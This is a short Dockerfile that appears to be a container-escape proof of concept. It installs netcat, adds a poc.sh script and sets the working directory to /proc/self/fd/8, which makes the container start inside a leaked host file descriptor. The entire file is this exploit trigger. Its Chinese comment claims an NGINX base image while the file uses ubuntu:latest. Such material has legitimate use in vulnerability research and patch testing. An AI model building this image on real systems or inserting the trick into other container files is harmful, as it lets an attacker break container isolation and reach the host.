# 使用官方的 NGINX 映像作为基础
FROM ubuntu:latest
RUN apt-get update -y && apt-get install netcat -y
ADD ./poc.sh /poc.sh
WORKDIR /proc/self/fd/8

